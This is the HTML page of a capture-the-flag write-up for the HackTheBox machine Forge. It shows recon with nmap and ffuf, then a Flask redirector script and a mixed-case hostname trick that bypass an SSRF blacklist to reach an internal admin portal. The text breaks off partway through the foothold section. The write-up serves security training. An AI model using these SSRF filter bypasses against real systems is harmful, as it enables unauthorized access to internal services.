<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Forge | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Computer Security,Cyber Security,Pentesting"><meta name=description content="Bypass SSRF filters using domain redirection and abusing Python PDB"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/forge/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.4fa7fde4cc7a4c9bb42b650e486217e32819f878f82ba1bd557f89540590c576.css integrity="sha256-T6f95Mx6TJu0K2UOSGIX4ygZ+Hj4K6G9VX+JVAWQxXY=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.2f98e6bd63d4b4790552a2fd8fdf9121b05beb3f6652b3216af158f45de23ed4.js integrity="sha256-L5jmvWPUtHkFUqL9j9+RIbBb6z9mUrMhavFY9F3iPtQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.104.3"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Forge"><meta property="og:description" content="Bypass SSRF filters using domain redirection and abusing Python PDB"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/forge/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/forge/imgs/image-20221015142332764.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2022-10-15T21:57:48+07:00"><meta property="article:modified_time" content="2022-10-15T21:57:48+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/ophiuchi/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/traverxec/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/heist/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/active/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/shocker/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/forge/imgs/image-20221015142332764.png"><meta name=twitter:title content="HackTheBox - Forge"><meta name=twitter:description content="Bypass SSRF filters using domain redirection and abusing Python PDB"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Forge","item":"https://fahmifj.github.io/hackthebox/forge/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Forge","name":"HackTheBox - Forge","description":"Bypass SSRF filters using domain redirection and abusing Python PDB","keywords":["HackTheBox","CTF","Computer Security","Cyber Security","Pentesting"],"articleBody":"Forge features a website that has SSRF vulnerability on its upload page. Leveraging this SSRF allows me to access the internal admin portal to obtain an FTP account. The SSRF vulnerability also exists on this admin portal and can be used to access the FTP server to retrieve the SSH key of the user. For the root part, there’s a sudo right on a Python script that spawns an interactive debugging session when an exception event occurs. Since the script can be run as root, it is possible to abuse the interactive debugging session to spawn a root shell.\nSkills Learned SSRF bypass filters Code Review Tools nmap ffuf Reconnaissance Nmap Scanning TCP ports with nmap discovers 2 open ports: SSH and HTTP. There’s also a filtered FTP service.\n→ kali@kali «forge» «10.10.14.4» $ nmap -sC -sV -oA nmap/default-script-forge 10.10.11.111 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-13 10:54 EDT Nmap scan report for forge.htb (10.10.11.111) Host is up (0.066s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA) | 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA) |_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Gallery Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.61 seconds Beside the OS and service version, the results didn’t show any interesting details.\nI will just add forge.htb to my /etc/hosts.\n→ kali@kali «~» «10.10.15.190» $ echo '10.10.11.111 forge.htb' | sudo tee -a /etc/hosts Enumeration TCP 80 - forge.htb The main website shows it’s a gallery of images.\nWapplyzer detects the site is running PHP.\nThere’s an upload page /upload. It allows visitors to upload a file from local disk or a URL.\nTesting Upload I’ll upload a legit JPG file. On submitting, it returns with a new URL to access the file.\nSince the filename get randomized, I assume it’s not kind of IDOR attack.\n→ kali@kali «tools» «10.10.15.190» $ curl -IL http://forge.htb/uploads/nMu63RoLNdk8BoE2a7b4 HTTP/1.1 200 OK Date: Thu, 13 Sept 2021 14:06:11 GMT Server: Apache/2.4.41 (Ubuntu) Content-Disposition: inline; filename=nMu63RoLNdk8BoE2a7b4 Content-Length: 51142 Last-Modified: Thu, 13 Sept 2021 14:05:20 GMT Cache-Control: no-cache Content-Type: image/jpg This time I’ll try the upload from url option. I’ll start a Python web server listening on port 8000. On submitting, there is a request coming from Forge’s IP.\n→ kali@kali «~» «10.10.15.190» $ hostit Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.11.111 - - [13/Sep/2021 09:23:38] \"GET /innocent.jpg HTTP/1.1\" 200 - With netcat, I could see the detailed request, where the website uses Python request module to fetch my hosted file. So I’m guessing that the site is running Python (most likely Flask).\n→ kali@kali «~» «10.10.15.190» $ nc -nvlp 8000 listening on [any] 8000 ... connect to [10.10.15.190] from (UNKNOWN) [10.10.11.111] 43242 GET /innocent.jpg HTTP/1.1 Host: 10.10.15.190:8000 User-Agent: python-requests/2.25.1 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive too many output retries : Broken pipe With non existent item, it shows an error which can proves it’s running Python in the back end.\nWhen attempting to access localhost and 127.0.0.1 , the website tells these are blacklisted.\nHow about FTP? Well I get a message that tells it only supports http and https. Therefore, I shouldn’t be able to access the FTP server with this.\nVhost Enumeration Fuzzing the vhost with ffuf reveals an interesting subdomain: admin.forge.htb.\n→ kali@kali «tools» «10.10.15.190» $ ffuf -u http://forge.htb -H \"Host: FUZZ.forge.htb\" -mc 200 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.0-dev ________________________________________________ :: Method : GET :: URL : http://forge.htb :: Wordlist : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.forge.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 ________________________________________________ admin [Status: 200, Size: 27, Words: 4, Lines: 2] I’ll add that to my /etc/hosts.\n→ kali@kali «tools» «10.10.15.190» $ echo '10.10.11.111 admin.forge.htb' | sudo tee -a /etc/hosts TCP 80 - admin.forge.htb Unfortunately, admin.forge.htb is not reachable from external.\nAccessing this domain from the upload feature would return the blacklisted address message.\nFoothold Shell as user SSRF Bypass with Domain Redirection Several SSRF bypass payload with number-based are actually works, but I’ve to find domain-based bypass since my interest is the admin.forge.htb.\nadmin.forge.htb and forge.htb are name-based vhost\nThe requests.get() function always follow redirection by default. Knowing this, there’s a high chance that bypass the SSRF filter using domain redirection will work.\nHere’s the strategy:\nHost a simple site (I’ll name it redirector) that always redirect any incoming request to http://admin.forge.htb. Submit this site URL on the upload page at forge.htb. And here’s a visualization of how the SSRF filter works (based on my assumptions).\nI’ll write the redirector using Flask.\nredirector.py:\nfrom flask import Flask, redirect app = Flask(__name__) @app.route('/') def index(): return redirect(\"http://admin.forge.htb/\",code=302) app.run(host='0.0.0.0', port=80) I’ll run the redirector with:\n→ kali@kali «exploits» «10.10.14.13» $ python3 redirector.py After the redirector is running, I’ll head to the upload page, intercept the upload request and change the URL value to my machine IP.\nOn submitting the request, I see there’s a success message in the response.\nA little explanation:\nMy IP is not in the blacklist address, so the web starts making a request to it, where the redirector is running. Since requests.get() follows redirection by default, the request goes straight to the site I intended to redirect to, which is admin.forge.htb and eventually bypasses the if condition that checks for blacklisted addresses. SSRF Bypass with Mixed Case Another way to bypass the filters is mixing upper case and lower case on the domain name like admin.forge.htB:\nSince mixed case is less complicated, I’ll prefer using it here.\nWith curl, I could see the page source of admin.forge.htb. There’s two links here: /announcements and another /upload.\n→ kali@kali «forge» «10.10.14.13» $ curl -s http://forge.htb/uploads/mn4G5G1B5oaF2SXMwbHH \u003c!DOCTYPE html\u003e Admin Portal ","wordCount":"1806","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/forge/imgs/image-20221015142332764.png","datePublished":"2022-10-15T21:57:48+07:00","dateModified":"2022-10-15T21:57:48+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/forge/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><h1 class=post-title>HackTheBox - Forge</h1><p class=post-description>Bypass SSRF filters using domain redirection and abusing Python PDB</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>October 15, 2022</span>&nbsp;&#183;&nbsp;<span class=meta-read>9 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/oscp-like/>OSCP like</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---forgehtb aria-label="TCP 80 - forge.htb">TCP 80 - forge.htb</a></li><li><a href=#vhost-enumeration aria-label="Vhost Enumeration">Vhost Enumeration</a></li><li><a href=#tcp-80---adminforgehtb aria-label="TCP 80 - admin.forge.htb">TCP 80 - admin.forge.htb</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-user aria-label="Shell as user">Shell as user</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/forge/imgs/image-20221015142332764_hu628aa14bbcea0e4b2937976f66621af4_181846_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/forge/imgs/image-20221015142332764_hu628aa14bbcea0e4b2937976f66621af4_181846_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/forge/imgs/image-20221015142332764_hu628aa14bbcea0e4b2937976f66621af4_181846_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/forge/imgs/image-20221015142332764.png 907w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/forge/imgs/image-20221015142332764.png alt="HackTheBox - Forge" width=907 height=700><p>HackTheBox - Forge</p></figure><p>Forge features a website that has SSRF vulnerability on its upload page. Leveraging this SSRF allows me to access the internal admin portal to obtain an FTP account. The SSRF vulnerability also exists on this admin portal and can be used to access the FTP server to retrieve the SSH key of the user. For the root part, there&rsquo;s a sudo right on a Python script that spawns an interactive debugging session when an exception event occurs. Since the script can be run as root, it is possible to abuse the interactive debugging session to spawn a root shell.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>SSRF bypass filters</li><li>Code Review</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>nmap</li><li>ffuf</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>Scanning TCP ports with nmap discovers 2 open ports: SSH and HTTP. There&rsquo;s also a filtered FTP service.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «forge» «10.10.14.4» 
</span></span><span class=line><span class=cl>$ nmap -sC -sV -oA nmap/default-script-forge 10.10.11.111   
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-09-13 10:54 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> forge.htb <span class=o>(</span>10.10.11.111<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.066s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>997</span> closed ports
</span></span><span class=line><span class=cl>PORT   STATE    SERVICE VERSION
</span></span><span class=line><span class=cl>21/tcp filtered ftp
</span></span><span class=line><span class=cl>22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open     http    Apache httpd 2.4.41
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Gallery
</span></span><span class=line><span class=cl>Service Info: Host: 10.10.11.111<span class=p>;</span> OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 11.61 seconds
</span></span></code></pre></div><p>Beside the OS and service version, the results didn&rsquo;t show any interesting details.</p><p>I will just add <code>forge.htb</code> to my <code>/etc/hosts</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «~» «10.10.15.190» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;10.10.11.111 forge.htb&#39;</span> <span class=p>|</span> sudo tee -a /etc/hosts
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---forgehtb>TCP 80 - forge.htb<a class=anchor aria-hidden=true href=#tcp-80---forgehtb>#</a></h3><p>The main website shows it&rsquo;s a gallery of images.</p><p><div class=img-container><img src=imgs/image-20210913200846701.png alt=image-20210913200846701></div></p><p>Wapplyzer detects the site is running PHP.</p><p><div class=img-container><img src=imgs/image-20221013203144811.png alt=image-20221013203144811></div></p><p>There&rsquo;s an upload page <code>/upload</code>. It allows visitors to upload a file from local disk or a URL.</p><p><div class=img-container><img src=imgs/image-20210913201318274.png alt=image-20210913201318274></div></p><h4 id=testing-upload>Testing Upload<a class=anchor aria-hidden=true href=#testing-upload>#</a></h4><p>I&rsquo;ll upload a legit JPG file. On submitting, it returns with a new URL to access the file.</p><p><div class=img-container><img src=imgs/image-20221013210552525.png alt=image-20221013210552525></div></p><p>Since the filename get randomized, I assume it&rsquo;s not kind of IDOR attack.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «tools» «10.10.15.190» 
</span></span><span class=line><span class=cl>$ curl -IL http://forge.htb/uploads/nMu63RoLNdk8BoE2a7b4 
</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Date: Thu, <span class=m>13</span> Sept <span class=m>2021</span> 14:06:11 GMT
</span></span><span class=line><span class=cl>Server: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>Content-Disposition: inline<span class=p>;</span> <span class=nv>filename</span><span class=o>=</span>nMu63RoLNdk8BoE2a7b4
</span></span><span class=line><span class=cl>Content-Length: <span class=m>51142</span>
</span></span><span class=line><span class=cl>Last-Modified: Thu, <span class=m>13</span> Sept <span class=m>2021</span> 14:05:20 GMT
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>Content-Type: image/jpg
</span></span></code></pre></div><p>This time I&rsquo;ll try the <strong>upload from url</strong> option. I&rsquo;ll start a Python web server listening on port 8000. On submitting, there is a request coming from Forge&rsquo;s IP.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «~» «10.10.15.190» 
</span></span><span class=line><span class=cl>$ hostit
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>8000</span> <span class=o>(</span>http://0.0.0.0:8000/<span class=o>)</span> ...
</span></span><span class=line><span class=cl>10.10.11.111 - - <span class=o>[</span>13/Sep/2021 09:23:38<span class=o>]</span> <span class=s2>&#34;GET /innocent.jpg HTTP/1.1&#34;</span> <span class=m>200</span> -
</span></span></code></pre></div><p>With <code>netcat</code>, I could see the detailed request, where the website uses Python request module to fetch my hosted file. So I&rsquo;m guessing that the site is running Python (most likely Flask).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «~» «10.10.15.190» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>8000</span> 
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>8000</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.15.190<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.111<span class=o>]</span> <span class=m>43242</span>
</span></span><span class=line><span class=cl>GET /innocent.jpg HTTP/1.1
</span></span><span class=line><span class=cl>Host: 10.10.15.190:8000
</span></span><span class=line><span class=cl>User-Agent: python-requests/2.25.1
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept: */*
</span></span><span class=line><span class=cl>Connection: keep-alive
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>too many output retries : Broken pipe
</span></span></code></pre></div><p>With non existent item, it shows an error which can proves it&rsquo;s running Python in the back end.</p><p><div class=img-container><img src=imgs/image-20210913203132729.png alt="	"></div></p><p>When attempting to access <code>localhost</code> and <code>127.0.0.1</code> , the website tells these are blacklisted.</p><p><div class=img-container><img src=imgs/image-20210913203935343.png alt=" "></div></p><p>How about FTP? Well I get a message that tells it only supports http and https. Therefore, I shouldn&rsquo;t be able to access the FTP server with this.</p><p><div class=img-container><img src=imgs/image-20221013213206158.png alt=image-20221013213206158></div></p><h3 id=vhost-enumeration>Vhost Enumeration<a class=anchor aria-hidden=true href=#vhost-enumeration>#</a></h3><p>Fuzzing the vhost with <code>ffuf</code> reveals an interesting subdomain: <code>admin.forge.htb</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «tools» «10.10.15.190» 
</span></span><span class=line><span class=cl>$ ffuf -u http://forge.htb -H <span class=s2>&#34;Host: FUZZ.forge.htb&#34;</span> -mc <span class=m>200</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        /<span class=s1>&#39;___\  /&#39;</span>___<span class=se>\ </span>          /<span class=err>&#39;</span>___<span class=se>\ </span>      
</span></span><span class=line><span class=cl>       /<span class=se>\ \_</span>_/ /<span class=se>\ \_</span>_/  __  __  /<span class=se>\ \_</span>_/       
</span></span><span class=line><span class=cl>       <span class=se>\ \ </span>,__<span class=se>\\</span> <span class=se>\ </span>,__<span class=se>\/\ \/\ \ \ \ </span>,__<span class=se>\ </span>     
</span></span><span class=line><span class=cl>        <span class=se>\ \ \_</span>/ <span class=se>\ \ \_</span>/<span class=se>\ \ \_\ \ \ \ \_</span>/      
</span></span><span class=line><span class=cl>         <span class=se>\ \_\ </span>  <span class=se>\ \_\ </span> <span class=se>\ \_</span>___/  <span class=se>\ \_\ </span>      
</span></span><span class=line><span class=cl>          <span class=se>\/</span>_/    <span class=se>\/</span>_/   <span class=se>\/</span>___/    <span class=se>\/</span>_/       
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       v1.3.0-dev
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> :: Method           : GET
</span></span><span class=line><span class=cl> :: URL              : http://forge.htb
</span></span><span class=line><span class=cl> :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span class=line><span class=cl> :: Header           : Host: FUZZ.forge.htb
</span></span><span class=line><span class=cl> :: Follow redirects : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Calibration      : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Timeout          : <span class=m>10</span>
</span></span><span class=line><span class=cl> :: Threads          : <span class=m>40</span>
</span></span><span class=line><span class=cl> :: Matcher          : Response status: <span class=m>200</span>
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>admin                   <span class=o>[</span>Status: 200, Size: 27, Words: 4, Lines: 2<span class=o>]</span>
</span></span></code></pre></div><p>I&rsquo;ll add that to my <code>/etc/hosts</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «tools» «10.10.15.190» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;10.10.11.111 admin.forge.htb&#39;</span> <span class=p>|</span> sudo tee -a /etc/hosts
</span></span></code></pre></div><h3 id=tcp-80---adminforgehtb>TCP 80 - admin.forge.htb<a class=anchor aria-hidden=true href=#tcp-80---adminforgehtb>#</a></h3><p>Unfortunately, <code>admin.forge.htb</code> is not reachable from external.</p><p><div class=img-container><img src=imgs/image-20210913210859484.png alt=image-20210913210859484></div></p><p>Accessing this domain from the upload feature would return the blacklisted address message.</p><p><div class=img-container><img src=imgs/image-20210913212229777.png alt=image-20210913212229777></div></p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-user>Shell as user<a class=anchor aria-hidden=true href=#shell-as-user>#</a></h3><h4 id=ssrf-bypass-with-domain-redirection>SSRF Bypass with Domain Redirection<a class=anchor aria-hidden=true href=#ssrf-bypass-with-domain-redirection>#</a></h4><p>Several SSRF bypass payload with number-based are actually works, but I&rsquo;ve to find domain-based bypass since my interest is the <code>admin.forge.htb</code>.</p><blockquote><p><code>admin.forge.htb</code> and <code>forge.htb</code> are name-based vhost</p></blockquote><p>The <code>requests.get()</code> function <a href=https://requests.readthedocs.io/en/latest/user/quickstart/#redirection-and-history>always follow redirection by default</a>. Knowing this, there&rsquo;s a high chance that bypass the SSRF filter using domain redirection will work.</p><p>Here&rsquo;s the strategy:</p><ul><li>Host a simple site (I&rsquo;ll name it <strong>redirector</strong>) that always redirect any incoming request to <code>http://admin.forge.htb</code>.</li><li>Submit this site URL on the upload page at <code>forge.htb</code>.</li></ul><p>And here&rsquo;s a visualization of how the SSRF filter works (based on my assumptions).</p><p><div class=img-container><img src=imgs/image-20221015214529436.png alt=image-20221015214529436></div></p><p>I&rsquo;ll write the redirector using Flask.</p><p><code>redirector.py</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>redirect</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=s2>&#34;http://admin.forge.htb/&#34;</span><span class=p>,</span><span class=n>code</span><span class=o>=</span><span class=mi>302</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>80</span><span class=p>)</span>
